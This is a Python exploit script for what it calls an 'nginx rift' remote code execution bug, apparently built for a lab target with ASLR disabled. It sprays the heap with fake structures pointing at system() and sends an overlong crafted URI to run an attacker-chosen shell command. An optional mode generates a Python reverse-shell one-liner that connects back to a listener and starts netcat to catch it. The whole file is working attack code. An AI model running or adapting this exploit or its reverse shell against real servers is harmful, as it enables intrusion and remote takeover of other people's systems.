#!/usr/bin/env python3
import argparse
import socket
import struct
import time
import sys

BODY_LEN = 4000
N_SPRAY = 20

SAFE = set()
_t = [0xffffffff, 0xd800086d, 0x50000000, 0xb8000001,
      0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff]
for _b in range(256):
    if not (_t[_b >> 5] & (1 << (_b & 0x1f))):
        SAFE.add(_b)

HEAP_BASE = 0x555555659000
LIBC_BASE = 0x7ffff77ba000
SYSTEM_ADDR = LIBC_BASE + 0x50d70

PREREAD_HEAP_OFFSETS = [
    0x05a427, 0x060e67,
    0x0ba557, 0x0bf367, 0x0c4177, 0x0c8f87, 0x0cdd97,
    0x0d2ba7, 0x0d79b7, 0x0dc7c7, 0x0e15d7, 0x0e63e7,
    0x0eb1f7, 0x0f0007, 0x0f4e17, 0x0f9c27, 0x0fea37,
    0x103847, 0x108657, 0x10d467,
]


def addr_is_safe(addr):
    return all(((addr >> (j * 8)) & 0xff) in SAFE for j in range(6))


def make_body(cmd, data_addr):
    fake_struct = struct.pack('<QQQ', SYSTEM_ADDR, data_addr, 0)
    cmd_bytes = cmd.encode('utf-8') + b'\x00'
    payload = fake_struct + cmd_bytes
    if len(payload) > BODY_LEN:
        print(f"[!] Command too long (body={len(payload)}, max={BODY_LEN})")
        sys.exit(1)
    return payload + b'\x41' * (BODY_LEN - len(payload))


def wait_alive(host, port, timeout=30):
    for _ in range(timeout):
        try:
            s = socket.create_connection((host, port), timeout=2)
            s.sendall(b"GET / HTTP/1.1\r\nHost:l\r\nConnection:close\r\n\r\n")
            s.recv(100)
            s.close()
            return True
        except Exception:
            time.sleep(1)
    return False


def attempt(host, port, target_bytes, body):
    sprays = []
    for i in range(N_SPRAY):
        try:
            s = socket.create_connection((host, port), timeout=5)
            req = (
                b"POST /spray HTTP/1.1\r\n"
                b"Host: l\r\n"
                b"Content-Length: " + str(BODY_LEN).encode() + b"\r\n"
                b"X-Delay: 60\r\n"
                b"Connection: close\r\n"
                b"\r\n"
                + body
            )
            s.sendall(req)
            sprays.append(s)
        except Exception:
            break
        time.sleep(0.005)
    time.sleep(0.2)

    try:
        a = socket.create_connection((host, port), timeout=5)
        time.sleep(0.02)
        v = socket.create_connection((host, port), timeout=5)
        time.sleep(0.02)
    except Exception:
        for s in sprays:
            try:
                s.close()
            except Exception:
                pass
        return False

    payload = "A" * 349 + "+" * 969 + target_bytes.decode("latin-1")
    a.sendall((f"GET /api/{payload} HTTP/1.1\r\n"
               f"Host:localhost\r\n").encode("latin-1"))
    time.sleep(0.05)
    v.sendall(b"GET / HTTP/1.1\r\nHost:localhost\r\n")
    time.sleep(0.05)
    a.sendall(b"X-Delay:60\r\nConnection:close\r\n\r\n")
    time.sleep(0.2)

    v.close()
    time.sleep(0.1)

    crashed = False
    try:
        a.sendall(b"X-Ping:1\r\n")
        a.settimeout(0.2)
        data = a.recv(1)
        if not data:
            crashed = True
    except socket.timeout:
        # It timed out. Nginx is either alive (waiting for backend) or hung in system().
        # Let's try to make a new connection to see if the worker is responsive.
        try:
            check_sock = socket.create_connection((host, port), timeout=0.2)
            check_sock.sendall(b"GET / HTTP/1.1\r\nHost:localhost\r\nConnection:close\r\n\r\n")
            check_data = check_sock.recv(10)
            check_sock.close()
            if not check_data:
                crashed = True
            else:
                crashed = False
        except Exception:
            crashed = True
    except (ConnectionResetError, BrokenPipeError, OSError):
        crashed = True

    for s in sprays:
        try:
            s.close()
        except Exception:
            pass
    try:
        a.close()
    except Exception:
        pass
    return crashed


def main():
    parser = argparse.ArgumentParser(
        description="nginx rift RCE exploit (ASLR disabled)"
    )
    parser.add_argument("--host", default="127.0.0.1",
                        help="target host (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=19321,
                        help="target port (default: 19321)")
    parser.add_argument("--cmd",
                        help="shell command to execute via system()")
    parser.add_argument("--shell", action="store_true",
                        help="execute a reverse shell back to the attacker")
    parser.add_argument("--listen-port", type=int, default=1337,
                        help="port to listen on for reverse shell (default: 1337)")
    parser.add_argument("--listen-ip", type=str, default="172.17.0.1",
                        help="IP address for reverse shell to connect back to (default: 172.17.0.1)")
    args = parser.parse_args()

    if not args.cmd and not args.shell:
        parser.error("either --cmd or --shell must be specified")
    if args.cmd and args.shell:
        parser.error("cannot specify both --cmd and --shell")

    host = args.host
    port = args.port
    
    if args.shell:
        local_ip = args.listen_ip
        cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{local_ip}\",{args.listen_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        print(f"[*] Generated reverse shell command: {cmd}")
    else:
        cmd = args.cmd

    if args.shell:
        import threading
        def listen_shell():
            print(f"[*] Listening for reverse shell on port {args.listen_port}...")
            # Use netcat if available, otherwise just use a simple socket listener
            import subprocess
            try:
                subprocess.run(["nc", "-l", "-p", str(args.listen_port)], check=True)
            except Exception:
                print(f"[!] Could not start netcat. Please run: nc -l -p {args.listen_port}")
                
        t = threading.Thread(target=listen_shell)
        t.daemon = True
        t.start()
        # Give the listener a moment to start
        time.sleep(1)

    candidates = []
    for i, off in enumerate(PREREAD_HEAP_OFFSETS):
        addr = HEAP_BASE + off
        if addr_is_safe(addr):
            candidates.append((i, addr))

    primary_addr = candidates[0][1]
    data_addr = primary_addr + 24
    body = make_body(cmd, data_addr)

    print(f"[*] Waiting for nginx on {host}:{port}...")
    if not wait_alive(host, port):
        print("[!] nginx not responding")
        return 1
    print("[+] Connected.")

    TRIES_PER_CANDIDATE = 10

    for i, addr in candidates:
        target = bytes([(addr >> (j * 8)) & 0xff for j in range(6)])

        for t in range(TRIES_PER_CANDIDATE):
            if not wait_alive(host, port, timeout=10):
                time.sleep(2)
                if not wait_alive(host, port, timeout=10):
                    print("    server not recovering, aborting")
                    return 1

            crashed = attempt(host, port, target, body)
            if crashed:
                if args.shell:
                    try:
                        while True:
                            time.sleep(1)
                    except KeyboardInterrupt:
                        pass
                else:
                    print(f"[+] try {t + 1}/{TRIES_PER_CANDIDATE} "
                      f"crashed — system(\"{cmd}\") executed")
                print(f"[+] Done.")
                return 0
            time.sleep(0.3)

        print("[+] All candidates tried — no crash detected.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
